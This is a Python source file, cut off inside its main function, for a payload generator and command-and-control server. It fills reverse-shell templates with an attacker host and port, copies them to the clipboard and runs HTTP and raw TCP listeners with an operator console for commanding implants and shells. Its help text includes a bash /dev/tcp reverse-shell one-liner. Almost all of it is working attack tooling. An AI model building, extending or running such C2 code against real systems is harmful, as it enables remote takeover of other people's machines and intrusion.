#!/usr/bin/env python3
"""
main.py
- Loads payload templates from payloads/linux.py and payloads/windows.py
- Validates user input (IP + HTTP/TCP ports)
- Generates payload (replaces {LHOST} and {LPORT})
- Prints payload in red and copies to clipboard
- Starts HTTP C2 + Raw TCP listener (from your listener code) bound to chosen HOST/ports
- Opens C2 console for interaction
"""

import importlib
import re
import socket
import sys
import threading
import time
from select import select
import argparse
import json

# external deps
from colorama import Fore, Style, init as colorama_init
import pyperclip

# init colorama
colorama_init(autoreset=True)

# -----------------------
# Utility / Validation
# -----------------------
def is_valid_ipv4(addr: str) -> bool:
    """Validate IPv4 address (0-255 per octet)."""
    if not addr or not isinstance(addr, str):
        return False
    parts = addr.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(p) <= 255 for p in parts)
    except ValueError:
        return False

def can_bind(host: str, port: int) -> bool:
    """Check whether we can bind to (host, port). Returns True if bind succeeds (then we close)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # try binding to the requested host/port
        s.bind((host, port))
        s.close()
        return True
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False

def ask_ip(prompt="Enter LHOST (IPv4): ") -> str:
    while True:
        v = input(prompt).strip()
        if not v:
            print("[!] Input cannot be empty.")
            continue
        if not is_valid_ipv4(v):
            print("[!] Invalid IPv4 address (format: X.X.X.X, each 0-255).")
            continue
        return v

def ask_port(prompt="Enter port (1-65535): ") -> int:
    while True:
        v = input(prompt).strip()
        if not v:
            print("[!] Input cannot be empty.")
            continue
        if not v.isdigit():
            print("[!] Port must be numeric.")
            continue
        p = int(v)
        if not (1 <= p <= 65535):
            print("[!] Port must be between 1 and 65535.")
            continue
        if p <= 1024:
            yn = input("[!] Ports 1-1024 require root/admin privileges to bind. Continue with this port? (y/N): ").strip().lower()
            if yn != "y":
                continue
        return p

def ask_choice(prompt: str, options: list) -> str:
    opts_lower = [o.lower() for o in options]
    while True:
        v = input(prompt).strip()
        if not v:
            print("[!] Input cannot be empty.")
            continue
        if v.lower() not in opts_lower:
            print(f"[!] Invalid option. Choose from: {', '.join(options)}")
            continue
        # return the canonical option string from options (preserve case)
        return options[opts_lower.index(v.lower())]

# -----------------------
# Payload loader/generator
# -----------------------
def load_payload_module(os_choice: str):
    """Dynamically import payloads.<os_choice>"""
    try:
        module = importlib.import_module(f"payloads.{os_choice.lower()}")
        if not hasattr(module, "payloads") or not isinstance(module.payloads, dict):
            raise ImportError(f"payloads.{os_choice.lower()} does not define a 'payloads' dict")
        return module
    except Exception as e:
        raise ImportError(f"Failed to load payload module for {os_choice}: {e}")

def generate_payload_text(module, payload_key: str, lhost: str, lport: int) -> str:
    """Replace placeholders in template with LHOST/LPORT and return final payload string."""
    if payload_key not in module.payloads:
        raise KeyError(f"Payload '{payload_key}' not found in module.")
    template = module.payloads[payload_key]
    # replace both placeholders robustly
    payload = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport))
    return payload

# -----------------------
# Custom payload storage / helpers
# -----------------------

def normalize_os_choice(flag: str) -> str:
    if not flag:
        return None
    val = flag.strip().lower()
    if val in ("w", "win", "windows"):
        return "Windows"
    if val in ("l", "lin", "linux"):
        return "Linux"
    return None


def normalize_connection(flag: str) -> str:
    if not flag:
        return None
    val = flag.strip().lower()
    if val in ("tcp", "http"):
        return val
    return None


def get_custom_store_path(os_choice: str) -> str:
    base_dir = os.path.dirname(os.path.abspath(__file__))
    filename = "custom_windows.json" if os_choice == "Windows" else "custom_linux.json"
    return os.path.join(base_dir, "payloads", filename)


def load_custom_payloads(os_choice: str) -> dict:
    """Load custom payloads for the OS. Structure: { name: {"template": str, "con": "tcp"|"http"} }"""
    path = get_custom_store_path(os_choice)
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            if isinstance(data, dict):
                return data
            return {}
    except FileNotFoundError:
        return {}
    except Exception:
        return {}


def save_custom_payload(os_choice: str, name: str, template: str, connection: str) -> None:
    path = get_custom_store_path(os_choice)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    current = load_custom_payloads(os_choice)
    current[name] = {"template": template, "con": connection}
    with open(path, "w", encoding="utf-8") as f:
        json.dump(current, f, indent=2)


def template_payload_content(raw: str, lhost: str, lport: int) -> str:
    try:
        port_str = str(lport)
        host_re = re.escape(lhost)
        port_re = re.escape(port_str)
        out = raw
        # 1) Replace host+port occurrences first (e.g., 10.0.0.1:4444 or 10.0.0.1/4444)
        out = re.sub(rf'({host_re})(:|/){port_re}', r'{LHOST}\2{LPORT}', out)
        # 2) Replace standalone host (constants) with placeholder
        out = re.sub(host_re, '{LHOST}', out)
        # 3) Replace port in common explicit contexts using the provided lport
        #    - after ':' or '/'
        out = re.sub(rf'(?<=:){port_re}(?!\d)', '{LPORT}', out)
        out = re.sub(rf'(?<=/){port_re}(?!\d)', '{LPORT}', out)
        #    - after '=' allowing optional whitespace (keep '=')
        out = re.sub(rf'(=)\s*{port_re}(?!\d)', r'\1{LPORT}', out)
        #    - after ',' allowing optional whitespace (argument lists)
        out = re.sub(rf'(?<=,)\s*{port_re}(?!\d)', '{LPORT}', out)
        #    - quoted numbers
        out = re.sub(rf'([\"\"])\s*{port_re}\s*([\"\"])', r'\1{LPORT}\2', out)
        #    - standalone numeric token
        out = re.sub(rf'(?<!\d){port_re}(?!\d)', '{LPORT}', out)

        # 4) Heuristic replacements if no {LPORT} yet (cover hard-coded ports not matching user-provided lport)
        if '{LPORT}' not in out:
            # a) PowerShell-style: $LPORT = 4444
            out = re.sub(r'(\$LPORT\s*=\s*)\d{1,5}', r'\1{LPORT}', out)
        if '{LPORT}' not in out:
            # b) TCPClient(host, 4444)
            out = re.sub(r'(?i)(TCPClient\([^,]+,\s*)\d{1,5}', r'\1{LPORT}', out)
        if '{LPORT}' not in out:
            # c) After {LHOST} or $LHOST separated by comma
            out = re.sub(r'(\{LHOST\}|\$LHOST)\s*,\s*\d{1,5}', r'\1,{LPORT}', out)
        if '{LPORT}' not in out:
            # d) {LHOST}:4444 or {LHOST}/4444
            out = re.sub(r'(\{LHOST\})(:|/)\d{1,5}', r'\1\2{LPORT}', out)
        if '{LPORT}' not in out:
            # e) Netcat-like: "... {LHOST} 4444 ..."
            out = re.sub(r'(\{LHOST\})\s+\d{1,5}', r'\1 {LPORT}', out)

        return out
    except Exception:
        # Fallback (naive) replacement
        return raw.replace(lhost, '{LHOST}').replace(str(lport), '{LPORT}')


def infer_connection_type_from_template(template: str) -> str:
    """Best-effort inference: return 'http' if HTTP indicators present else 'tcp'."""
    low = (template or "").lower()
    if ("http://" in low) or ("https://" in low) or ("invoke-webrequest" in low) or ("iwr " in low) or ("curl " in low) or ("wget " in low):
        return "http"
    return "tcp"


def merge_builtins_and_customs(builtins: dict, customs: dict) -> dict:
    """Return a new dict name->template (customs override builtins on key collision)."""
    merged = dict(builtins or {})
    for name, entry in (customs or {}).items():
        if isinstance(entry, dict) and "template" in entry:
            merged[name] = entry["template"]
        elif isinstance(entry, str):
            merged[name] = entry
    return merged


def list_keys_filtered_by_connection(builtins: dict, customs: dict, connection: str) -> list:
    """Return sorted list of keys whose connection matches the requested connection."""
    keys = []
    seen = set()
    # built-ins by inference
    for k, tmpl in (builtins or {}).items():
        if k in seen:
            continue
        conn = infer_connection_type_from_template(tmpl)
        if conn == connection:
            keys.append(k)
            seen.add(k)
    # customs by explicit meta or inference fallback
    for k, entry in (customs or {}).items():
        if k in seen:
            continue
        if isinstance(entry, dict):
            conn = entry.get("con") or infer_connection_type_from_template(entry.get("template", ""))
            tmpl = entry.get("template", "")
        else:
            conn = infer_connection_type_from_template(str(entry))
            tmpl = str(entry)
        if conn == connection:
            keys.append(k)
            seen.add(k)
    return sorted(keys)


def find_available_port(host: str, start_port: int, limit: int = 50) -> int:
    """Return start_port if bindable, else scan up to start_port+limit for a free port."""
    if can_bind(host, start_port):
        return start_port
    for p in range(start_port + 1, start_port + 1 + limit):
        if can_bind(host, p):
            return p
    return None

# -----------------------
# C2 / Listener code (adapted from your listener)
# -----------------------
# Globals populated after user input
HOST = None
HTTP_PORT = None
RAW_TCP_PORT = None
IMPLANT_TIMEOUT = 30
# Track selected OS to tailor HTTP command behavior
OS_CHOICE = None

http_sessions = {}
shell_sessions = {}
shell_id_counter = 0
current_session = None
global_lock = threading.Lock()

# When set to a shell_id, the console is in raw interactive mode with that shell
interactive_shell_active_for_id = None
# Fallback line-mode interaction (no raw TTY)
line_mode_shell_id = None

import http.server
import socketserver
import re as _re
import os
import termios
import tty

class C2Handler(http.server.BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

    def do_GET(self):
        uid = self.headers.get("Authorization")
        if not uid:
            return
        path = self.path.strip("/")
        with global_lock:
            if uid not in http_sessions:
                http_sessions[uid] = {"last_cmd": "", "last_sent": "", "output": "", "last_seen": time.time(), "cwd": None, "has_new_output": False, "awaiting": False}
                sys.stdout.write(f"\r[+] New HTTP implant registered: {uid}\nC2 > ")
                sys.stdout.flush()
            http_sessions[uid]["last_seen"] = time.time()

        self._set_headers()
        parts = uid.split('-')
        if len(parts) >= 2:
            beacon_path = parts[0]
            command_fetch_path = parts[1]
            if path == command_fetch_path:
                with global_lock:
                    cmd = http_sessions[uid].get("last_cmd", "")
                    http_sessions[uid]["last_sent"] = cmd
                    http_sessions[uid]["last_cmd"] = ""
                self.wfile.write((cmd + "\n").encode())
                return
            elif path == beacon_path:
                self.wfile.write(b"OK")
                return
        self.wfile.write(b"None")

    def do_POST(self):
        uid = self.headers.get("Authorization")
        if not uid:
            return
        length = int(self.headers.get("Content-Length", 0))
        raw_data = self.rfile.read(length).decode(errors="ignore")
        # decode numeric payloads if present
        if _re.fullmatch(r"(\d+\s*)+", raw_data.strip()):
            try:
                byte_values = [int(b) for b in raw_data.strip().split()]
                decoded_output = bytes(byte_values).decode("utf-8", errors="ignore")
            except Exception:
                decoded_output = raw_data
        else:
            decoded_output = raw_data

        with global_lock:
            if uid in http_sessions:
                http_sessions[uid]["output"] = decoded_output
                http_sessions[uid]["last_seen"] = time.time()
                http_sessions[uid]["has_new_output"] = True
                # Prefer explicit CWD marker if present, else use heuristics
                clean = (decoded_output or "").strip()
                # Marker form: CWD:<absolute_path>
                marker_lines = [ln.strip() for ln in clean.splitlines() if ln.strip().startswith("CWD:")]
                if marker_lines:
                    try:
                        last_marker = marker_lines[-1]
                        _, path_val = last_marker.split(":", 1)
                        http_sessions[uid]["cwd"] = path_val.strip()
                    except Exception:
                        pass
                else:
                    last_sent = http_sessions[uid].get("last_sent", "")
                    if "Get-Location" in last_sent or last_sent.strip().lower() == "pwd":
                        lines = [ln for ln in clean.splitlines() if ln.strip()]
                        if lines:
                            candidate = lines[-1].strip()
                            if re.match(r"^[A-Za-z]:\\", candidate) or candidate.startswith("\\") or candidate.startswith("/"):
                                http_sessions[uid]["cwd"] = candidate

        self._set_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        return

class ThreadingTCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

def run_http_server():
    global HOST, HTTP_PORT
    with ThreadingTCPServer((HOST, HTTP_PORT), C2Handler) as httpd:
        print(f"[+] Starting HTTP C2 on {HOST}:{HTTP_PORT}")
        httpd.serve_forever()

def monitor_http_implants():
    global current_session
    while True:
        time.sleep(10)
        with global_lock:
            disconnected_uids = [uid for uid, data in http_sessions.items() if time.time() - data["last_seen"] > IMPLANT_TIMEOUT]
            for uid in disconnected_uids:
                sys.stdout.write(f"\r[-] HTTP implant {uid} has disconnected (timeout).\n")
                if current_session == ('http', uid):
                    current_session = None
                    sys.stdout.write(f"[*] You have been logged out from {uid}.\n")
                if uid in http_sessions:
                    del http_sessions[uid]
                sys.stdout.write("C2 > ")
                sys.stdout.flush()

def handle_shell_connection(client_socket, address, shell_id):
    global current_session, interactive_shell_active_for_id
    # Try to make the socket more responsive
    try:
        client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception:
        pass

    while True:
        try:
            # If console is currently doing raw interactive IO for this shell, do not read here to avoid races
            if interactive_shell_active_for_id == shell_id:
                time.sleep(0.05)
                continue

            ready_to_read, _, _ = select([client_socket], [], [], 1)
            if ready_to_read:
                data = client_socket.recv(4096)
                if not data:
                    raise ConnectionResetError
                with global_lock:
                    is_current = current_session == ('shell', shell_id)
                if is_current:
                    sys.stdout.write(data.decode(errors='ignore'))
                    sys.stdout.flush()
        except (ConnectionResetError, BrokenPipeError, OSError):
            with global_lock:
                is_current = (current_session == ('shell', shell_id))
                if shell_id in shell_sessions:
                    del shell_sessions[shell_id]
                sys.stdout.write(f"\r[-] Shell {shell_id} ({address[0]}) has disconnected.\n")
                if is_current:
                    current_session = None
                    sys.stdout.write(f"[*] You have been logged out from shell {shell_id}.\n")
                sys.stdout.write("C2 > ")
                sys.stdout.flush()
            try:
                client_socket.close()
            except Exception:
                pass
            break

def run_raw_tcp_server():
    global shell_id_counter, HOST, RAW_TCP_PORT
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, RAW_TCP_PORT))
    server_socket.listen(5)
    print(f"[+] Starting Raw TCP Listener on {HOST}:{RAW_TCP_PORT} for reverse shells.")
    while True:
        client_socket, address = server_socket.accept()
        with global_lock:
            shell_id_counter += 1
            shell_id = shell_id_counter
            shell_sessions[shell_id] = {'socket': client_socket, 'address': address}
        sys.stdout.write(f"\r[+] New Shell connection (ID: {shell_id}) from {address[0]}:{address[1]}\nC2 > ")
        sys.stdout.flush()
        threading.Thread(target=handle_shell_connection, args=(client_socket, address, shell_id), daemon=True).start()

def interactive_shell_session(shell_id: int):
    """Enter a raw interactive session with the given shell.

    - Bridges local stdin/stdout to the remote shell socket.
    - Exit back to the C2 console with Ctrl-].
    """
    global current_session, interactive_shell_active_for_id

    with global_lock:
        if shell_id not in shell_sessions:
            print("[!] Shell is no longer active.")
            return
        shell_socket = shell_sessions[shell_id]['socket']

    # Configure local terminal for raw mode
    fd = sys.stdin.fileno() if hasattr(sys.stdin, 'fileno') else -1
    # Guard against invalid fds
    if not isinstance(fd, int) or fd < 0:
        raise OSError("stdin has no valid file descriptor for raw mode")
    old_settings = None
    try:
        # Only attempt raw if stdin is a TTY
        if not os.isatty(fd):
            raise OSError("stdin is not a TTY")
        old_settings = termios.tcgetattr(fd)
        tty.setraw(fd)
    except Exception:
        old_settings = None

    if old_settings is None:
        # Raw mode is not available; raise to trigger fallback to line mode
        raise OSError("stdin is not a TTY or cannot enter raw mode")

    print(f"[+] Interacting with shell {shell_id}. Press Ctrl-] to return to C2 console.")
    # Ensure the cursor is at the start of a new line in raw mode
    try:
        sys.stdout.write("\r\n")
        sys.stdout.flush()
    except Exception:
        pass
    interactive_shell_active_for_id = shell_id
    current_session = ('shell', shell_id)

    try:
        shell_socket.setblocking(False)
        # Proactively request a prompt from remote shell (POSIX-safe)
        try:
            shell_socket.sendall(b'printf "%s" "${PS1:-$ }"\n')
        except Exception:
            pass
        while True:
            rlist = [shell_socket, fd]
            ready, _, _ = select(rlist, [], [], 0.1)
            for r in ready:
                if r is shell_socket:
                    try:
                        data = shell_socket.recv(4096)
                    except BlockingIOError:
                        data = None
                    if not data:
                        # Disconnected
                        print(f"\n[-] Shell {shell_id} has disconnected.")
                        with global_lock:
                            if shell_id in shell_sessions:
                                del shell_sessions[shell_id]
                            if current_session == ('shell', shell_id):
                                current_session = None
                        return
                    # Normalize LF to CRLF in raw mode to avoid diagonal output
                    try:
                        text = data.decode(errors='ignore')
                    except Exception:
                        text = ''
                    if text:
                        text = text.replace('\r\n', '\n')
                        text = text.replace('\n', '\r\n')
                        sys.stdout.write(text)
                        sys.stdout.flush()
                else:
                    # stdin (read as much as available)
                    try:
                        buf = os.read(fd, 1024)
                    except Exception:
                        buf = b''
                    if not buf:
                        continue
                    # Local echo for better UX
                    try:
                        for b in buf:
                            if b in (8, 127):
                                sys.stdout.write('\b \b')
                            elif b == 13:  # CR
                                sys.stdout.write('\r\n')
                            elif b == 9 or 32 <= b < 127:  # tab or printable
                                sys.stdout.write(chr(b))
                            # ignore other control characters
                        sys.stdout.flush()
                    except Exception:
                        pass
                    # Handle Ctrl-] (0x1d) to exit
                    if b'\x1d' in buf:
                        cut = buf.split(b'\x1d', 1)[0]
                        if cut:
                            try:
                                shell_socket.sendall(cut.replace(b'\r', b'\n'))
                            except Exception:
                                print(f"\n[*] Failed to send to shell {shell_id}. It may have disconnected.")
                        print("\n[*] Returning to C2 console.")
                        return
                    # Normalize CR to LF so Enter executes on remote
                    to_send = buf.replace(b'\r', b'\n')
                    try:
                        shell_socket.sendall(to_send)
                    except Exception:
                        print(f"\n[*] Failed to send to shell {shell_id}. It may have disconnected.")
                        return
    finally:
        interactive_shell_active_for_id = None
        # Restore terminal
        if old_settings is not None:
            try:
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            except Exception:
                pass
        with global_lock:
            if current_session == ('shell', shell_id):
                current_session = None
        # Repaint prompt
        sys.stdout.write("C2 > ")
        sys.stdout.flush()

def enter_shell_session(shell_id: int):
    """Wrapper to enter shell session.

    Always uses line-mode to ensure stable interaction with bash/sh.
    """
    global current_session, line_mode_shell_id
    with global_lock:
        if shell_id not in shell_sessions:
            print("[!] Shell is no longer active.")
            return
        current_session = ('shell', shell_id)
        line_mode_shell_id = shell_id
    print(f"[+] Interacting with shell {shell_id} in line mode. Type commands and press Enter. Press Ctrl-C to return to C2 console.")
    # Try to request a prompt immediately in line mode
    try:
        shell_sessions[shell_id]['socket'].sendall(b'printf "%s" "${PS1:-$ }"\n')
    except Exception:
        pass

def wait_for_http_response(uid: str, timeout_seconds: int = 15):
    """Render a progress bar while waiting for an HTTP implant response, then print it.

    The bar fills to 100% when the response arrives. If it takes longer than the
    timeout, the bar holds at 99% until the response comes.
    """
    start_time = time.time()
    bar_width = 30

    while True:
        with global_lock:
            session = http_sessions.get(uid)
            has = bool(session and session.get("has_new_output"))
            output = session.get("output") if session else ""
        if has:
            percent = 100
            filled = bar_width
            bar = "#" * filled + "." * (bar_width - filled)
            sys.stdout.write(f"\r[waiting] [{bar}] {percent}%\n")
            sys.stdout.flush()
            break
        elapsed = time.time() - start_time
        percent = min(99, int((elapsed / max(timeout_seconds, 1)) * 100))
        filled = int((percent / 100) * bar_width)
        bar = "#" * filled + "." * (bar_width - filled)
        sys.stdout.write(f"\r[waiting] [{bar}] {percent}%")
        sys.stdout.flush()
        time.sleep(0.1)

    # Print the captured output after bar completes (strip control markers)
    lines = (output or "").splitlines()
    cleaned_lines = [ln for ln in lines if not (ln.strip().startswith("CWD:") or ln.strip() == "CDERR")]
    clean_display = "\n".join(cleaned_lines).strip()
    if clean_display and clean_display != "OK":
        sys.stdout.write(clean_display + "\n")
    # Reset flags and repaint prompt
    with global_lock:
        if uid in http_sessions:
            http_sessions[uid]["has_new_output"] = False
            http_sessions[uid]["awaiting"] = False
    sys.stdout.write("C2 > ")
    sys.stdout.flush()

def c2_console():
    global current_session, line_mode_shell_id
    list_map = {}
    print("\n[*] C2 Console Started. Type 'help' for commands.")
    while True:
        try:
            prompt = "C2 > "
            with global_lock:
                if line_mode_shell_id is not None and current_session == ('shell', line_mode_shell_id):
                    prompt = ""
            cmd_input = input(prompt)

            # If in line-mode shell interaction, forward line directly
            with global_lock:
                if line_mode_shell_id is not None and current_session == ('shell', line_mode_shell_id):
                    shell_id = line_mode_shell_id
                    if shell_id in shell_sessions:
                        shell_socket = shell_sessions[shell_id]['socket']
                        try:
                            shell_socket.sendall((cmd_input + '\n').encode())
                        except Exception:
                            print(f"\r[*] Failed to send to shell {shell_id}. It may have disconnected.")
                            current_session = None
                            line_mode_shell_id = None
                    else:
                        print("\r[*] Current shell has disconnected. Use 'list' and 'select'.")
                        current_session = None
                        line_mode_shell_id = None
                    continue

            cmd_input = cmd_input.strip()
            if not cmd_input:
                continue

            if cmd_input.lower() in ('help', '?'):
                print("Commands:\n"
                      "  list          - List all active sessions (HTTP and Shells).\n"
                      "  select <ID>   - Select a session to interact with.\n"
                      "  exit          - Exit the C2 server.\n"
                      "  <any other>   - Command to send to the selected HTTP implant.")
                continue

            if cmd_input.lower() == "list":
                list_map.clear()
                i = 1
                print("\n--- Active Sessions ---")
                print("ID  Type   Target                    Last Seen/Info")
                print("--  ----   ------------------------  -----------------")
                with global_lock:
                    for uid, data in http_sessions.items():
                        delta = int(time.time() - data["last_seen"])
                        print(f"{i:<3} HTTP   {uid:<24} {delta}s ago")
                        list_map[i] = ('http', uid)
                        i += 1
                    for shell_id, data in shell_sessions.items():
                        addr_str = f"{data['address'][0]}:{data['address'][1]}"
                        print(f"{i:<3} SHELL  {f'ID: {shell_id}':<24} {addr_str}")
                        list_map[i] = ('shell', shell_id)
                        i += 1
                if not list_map:
                    print("[!] No active sessions.")
                print()
                continue

            if cmd_input.lower().startswith("select "):
                try:
                    selection_id = int(cmd_input.split(maxsplit=1)[1])
                    if selection_id in list_map:
                        session_type, session_id = list_map[selection_id]
                        if session_type == 'shell':
                            enter_shell_session(session_id)
                        else:
                            with global_lock:
                                current_session = ('http', session_id)
                            print(f"[+] Selected implant {session_id}")
                    else:
                        print("[!] Invalid selection ID.")
                except (ValueError, IndexError):
                    print("[!] Invalid format. Use 'select <ID>' from the 'list' command.")
                continue

            if cmd_input.lower() in ("exit", "quit"):
                print("[*] Shutting down C2 server.")
                sys.exit(0)

            # HTTP mode commands
            if not current_session:
                print("[!] No session selected. Use 'list' and 'select <ID>'.")
                continue

            if current_session[0] == 'http':
                uid = current_session[1]
                needs_wait = False
                with global_lock:
                    if uid in http_sessions:
                        if cmd_input.startswith("cd"):
                            parts = cmd_input.split(maxsplit=1)
                            if len(parts) == 1:
                                # Reset to default CWD (no-op on target)
                                http_sessions[uid]['cwd'] = None
                                needs_wait = False
                            else:
                                arg = parts[1].strip()
                                if ((arg.startswith('"') and arg.endswith('"')) or (arg.startswith("'") and arg.endswith("'"))):
                                    arg = arg[1:-1]
                                current_cwd = http_sessions[uid].get('cwd')
                                is_absolute = bool(re.match(r'^[A-Za-z]:[\\/]', arg)) or arg.startswith('/') or arg.startswith('\\')
                                if is_absolute or not current_cwd:
                                    target_dir = arg
                                else:
                                    sep = '\\' if ('\\' in current_cwd or re.match(r'^[A-Za-z]:', current_cwd)) else '/'
                                    if current_cwd.endswith(sep):
                                        target_dir = f"{current_cwd}{arg}"
                                    else:
                                        target_dir = f"{current_cwd}{sep}{arg}"
                                # Build a verification command for Windows PowerShell
                                verify_cmd = None
                                if OS_CHOICE == "Windows":
                                    verify_cmd = (
                                        "$ErrorActionPreference='SilentlyContinue';"
                                        f"Set-Location -Path \"{target_dir}\";"
                                        "if($?){Write-Output \"CWD:\" + (Get-Location).Path}else{Write-Output \"CDERR\"}"
                                    )
                                else:
                                    # Generic POSIX fallback
                                    verify_cmd = (
                                        f"if [ -d \"{target_dir}\" ]; then cd \"{target_dir}\" && pwd | sed 's/^/CWD:/'; else echo CDERR; fi"
                                    )
                                http_sessions[uid]['last_cmd'] = verify_cmd
                                http_sessions[uid]['has_new_output'] = False
                                http_sessions[uid]['awaiting'] = True
                                needs_wait = True
                        else:
                            cwd = http_sessions[uid].get('cwd')
                            to_send = f'cd "{cwd}"; {cmd_input}' if cwd else cmd_input
                            http_sessions[uid]['last_cmd'] = to_send
                            http_sessions[uid]['has_new_output'] = False
                            http_sessions[uid]['awaiting'] = True
                            needs_wait = True
                    else:
                        print(f"[!] HTTP implant {uid} is no longer active.")
                        current_session = None
                if needs_wait:
                    wait_for_http_response(uid)
                continue

        except KeyboardInterrupt:
            with global_lock:
                if current_session and current_session[0] == 'shell':
                    print(f"\n[*] Disengaging from shell {current_session[1]}. Type 'list' to see sessions.")
                    current_session = None
                    # Reset line-mode flag if active
                    line_mode_shell_id = None
                    continue
            print("\n[*] Keyboard interrupt received, exiting.")
            sys.exit(0)
        except Exception as e:
            print(f"\n[!] An error occurred: {e}")

# -----------------------
# main entrypoint
# -----------------------
def main():
    global HOST, HTTP_PORT, RAW_TCP_PORT, OS_CHOICE

    print("=== Payload Generator + Listener ===\n")

    # CLI parsing
    parser = argparse.ArgumentParser(
        description="Payload generator + C2 listener",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=(
            "Examples:\n"
            "  - Use built-ins or stored payloads and start listeners:\n"
            "    ./main.py -m=b -os=l -con=tcp -lhost=127.0.0.1 -lport=4444\n"
            "    ./main.py -m=b -os=w -con=http -lhost=10.0.0.5 -lport=2222\n"
            "    Optional: -k=<payload_key> to auto-select.\n\n"
            "  - Store a custom payload (host/port will be templated as {LHOST}/{LPORT}):\n"
            "    ./main.py -m=c -os=l -con=tcp -lhost=127.0.0.1 -lport=5555 -n=mybash -pay='bash -i >& /dev/tcp/127.0.0.1/5555 0>&1'\n"
            "    ./main.py -m=c -os=w -con=http -lhost=10.0.0.5 -lport=2222 -n=mypwsh -pay=\"powershell ... http://10.0.0.5:2222 ...\"\n\n"
            "Notes:\n"
            "- -os: l (Linux) or w (Windows)\n"
            "- -con: tcp or http\n"
            "- In -m=b, the opposite listener uses defaults (HTTP 2222, TCP 4444).\n"
            "- Custom payloads are saved in payloads/custom_linux.json or payloads/custom_windows.json.\n"
        ),
    )
    parser.add_argument("-help", action="help", help="Show this help message and exit")
    parser.add_argument("-m", "--mode", help="Mode: b = use/generate & listen, c = create/store payload")
    parser.add_argument("-os", "--os", dest="os_flag", help="Target OS: w = Windows, l = Linux")
    parser.add_argument("-con", "--connection", dest="connection", help="Connection type: http or tcp")
    parser.add_argument("-lhost", dest="lhost", help="Listener host / LHOST")
    parser.add_argument("-lport", dest="lport", type=int, help="Listener port / LPORT for the chosen connection type")
    parser.add_argument("-n", "--name", dest="name", help="Name for the payload (store mode)")
    parser.add_argument("-pay", "--payload", dest="payload", help="Payload content (store mode). Include your actual IP and port so they can be templated.")
    parser.add_argument("-k", "--key", dest="key", help="Key/name of payload to auto-select (use mode)")
    args, unknown = parser.parse_known_args()

    # If explicit CLI mode is requested
    if args.mode:
        mode = args.mode.strip().lower()
        if mode not in ("b", "c"):
            print("[!] Invalid -m. Use -m=b (use) or -m=c (create).")
            sys.exit(2)

        os_choice = normalize_os_choice(args.os_flag)
        if not os_choice:
            print("[!] -os is required (w or l).")
            sys.exit(2)

        if mode == "c":
            # Create/store payload
            connection = normalize_connection(args.connection)
            if connection not in ("http", "tcp"):
                print("[!] In create mode, -con must be 'http' or 'tcp'.")
                sys.exit(2)
            if not (args.lhost and is_valid_ipv4(args.lhost)):
                print("[!] In create mode, a valid -lhost is required.")
                sys.exit(2)
            if not (args.lport and 1 <= args.lport <= 65535):
                print("[!] In create mode, a valid -lport (1-65535) is required.")
                sys.exit(2)
            if not args.name:
                print("[!] In create mode, -n (payload name) is required.")
                sys.exit(2)
            if not args.payload:
                print("[!] In create mode, -pay (payload content) is required.")
                sys.exit(2)

            # Template the provided payload content robustly
            raw = args.payload
            templated = template_payload_content(raw, args.lhost, args.lport)
            save_custom_payload(os_choice, args.name, templated, connection)
            print(f"[+] Stored payload '{args.name}' for {os_choice} ({connection}).")
            sys.exit(0)

        # Use/generate and listen
        connection = normalize_connection(args.connection)
        if connection not in ("http", "tcp"):
            print("[!] In use mode, -con must be 'http' or 'tcp'.")
            sys.exit(2)
        if not (args.lhost and is_valid_ipv4(args.lhost)):
            print("[!] In use mode, a valid -lhost is required.")
            sys.exit(2)
        if not (args.lport and 1 <= args.lport <= 65535):
            print("[!] In use mode, a valid -lport (1-65535) is required.")
            sys.exit(2)

        lhost = args.lhost
        DEFAULT_HTTP = 2222
        DEFAULT_TCP = 4444
        # Assign ports based on chosen connection; the other gets a default (adjust if unavailable)
        if connection == "tcp":
            tcp_port = args.lport
            http_port = find_available_port(lhost, DEFAULT_HTTP) or DEFAULT_HTTP
        else:
            # http
            http_port = args.lport
            tcp_port = find_available_port(lhost, DEFAULT_TCP) or DEFAULT_TCP

        if not can_bind(lhost, http_port):
            print(f"[!] Cannot bind HTTP on {lhost}:{http_port}.")
            sys.exit(2)
        if not can_bind(lhost, tcp_port):
            print(f"[!] Cannot bind TCP on {lhost}:{tcp_port}.")
            sys.exit(2)

        # Load built-in + custom payloads and filter by connection
        module = load_payload_module(os_choice)
        customs = load_custom_payloads(os_choice)
        combined = merge_builtins_and_customs(getattr(module, "payloads", {}), customs)

        # Keys filtered by requested connection
        keys = list_keys_filtered_by_connection(getattr(module, "payloads", {}), customs, connection)
        if not keys:
            print(f"[!] No payloads available for {os_choice} ({connection}). Add some with -m=c.")
            sys.exit(2)

        print("\nAvailable payloads (filtered):")
        for k in keys:
            print(" -", k)

        # Choose key (CLI or prompt)
        if args.key:
            if args.key not in combined or args.key not in keys:
                print(f"[!] Payload key '{args.key}' not found for the requested filters.")
                sys.exit(2)
            payload_key = args.key
        else:
            payload_key = ask_choice("Select payload (type exact key): ", keys)

        # Create a proxy module with merged dict for generator
        ModuleProxy = type("ModuleProxy", (), {})
        module_proxy = ModuleProxy()
        module_proxy.payloads = combined

        selected_port = tcp_port if connection == "tcp" else http_port
        payload_text = generate_payload_text(module_proxy, payload_key, lhost, selected_port)

        print("\n[+] Generated payload (copied to clipboard):\n")
        print(Fore.RED + payload_text + Style.RESET_ALL)
        try:
            pyperclip.copy(payload_text)
            print("[+] Payload copied to clipboard.")
        except Exception as e:
            print(f"[!] Could not copy to clipboard: {e}")

        # Assign globals and start listeners + console
        HOST = lhost
        HTTP_PORT = http_port
        RAW_TCP_PORT = tcp_port
        global OS_CHOICE
